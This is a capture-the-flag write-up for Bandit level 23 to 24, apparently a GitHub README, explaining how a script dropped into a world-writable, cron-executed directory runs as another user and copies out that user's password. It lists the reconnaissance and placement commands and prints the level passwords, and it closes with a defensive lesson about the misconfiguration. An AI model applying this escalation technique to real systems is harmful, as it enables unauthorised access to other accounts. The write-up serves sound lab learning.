📘 Bandit Level 23 → Level 24

🎯 Objective

Log in to the Bandit game and retrieve the next level password by abusing a writable cron-executed directory.

🧭 Quick Action Summary

Login as bandit23

Inspect the cron job running as bandit24

Identify the writable directory used by the cron script

Create a malicious script

Place it in the cron-executed directory

Wait for cron execution

Read the generated password file

🔑 Credentials Provided

Username: bandit23

Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga

🔍 Method of Solve

A cron job runs a script as bandit24.

The script:

Navigates to /var/spool/bandit24/foo

Executes all scripts inside that directory

Deletes them after execution

Since the directory is world-writable, a custom script can be placed there to copy the password to a readable location.

🧪 Commands Used

ls /etc/cron.d/cronjob_bandit24

cat /etc/cron.d/cronjob_bandit24

cat /usr/bin/cronjob_bandit24.sh

ls -ld /var/spool/bandit24/foo

mkdir /tmp/b23

cd /tmp/b23

nano getpass.sh

chmod +x getpass.sh

cp getpass.sh /var/spool/bandit24/foo/

sleep 60

cat /tmp/bandit24_pass


🧩 Command Purpose

ls /etc/cron.d/cronjob_bandit24	Confirms the cron job exists

cat /etc/cron.d/cronjob_bandit24	Shows when and how the cron job runs

cat /usr/bin/cronjob_bandit24.sh	Reveals the script logic executed by cron

ls -ld /var/spool/bandit24/foo	Confirms the directory is writable

mkdir /tmp/b23	Creates a workspace directory

nano getpass.sh	Creates a malicious script

chmod +x getpass.sh	Makes the script executable

cp getpass.sh /var/spool/bandit24/foo/	Places the script in the cron-executed directory

sleep 60	Waits for cron execution

cat /tmp/bandit24_pass	Reads the next level password

📸 Screenshot Evidence

<img width="950" height="530" alt="Screenshot 2025-12-30 154133" src="https://github.com/user-attachments/assets/0aa195fb-6818-4be1-8891-c3d5275ea454" />

<img width="808" height="883" alt="Screenshot 2025-12-30 154437" src="https://github.com/user-attachments/assets/eca7da19-a5c7-4272-a09b-59d26b9c7c31" />

<img width="881" height="245" alt="Screenshot 2025-12-30 154657" src="https://github.com/user-attachments/assets/adae0b7c-0423-4983-9b3e-fcb6940b1385" />



🔑 Next Level Password

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

🧠 Explanation

Cron runs as bandit24

It executes all files in /var/spool/bandit24/foo

Files run with elevated privileges

Custom script copies the password

Output is saved in /tmp

Password is successfully retrieved

🔐 Concept Learned

Writable cron-executed directories lead directly to privilege escalation.

🛡️ Security Insight

Cron jobs must never execute files from writable directories.
This is a critical system misconfiguration.
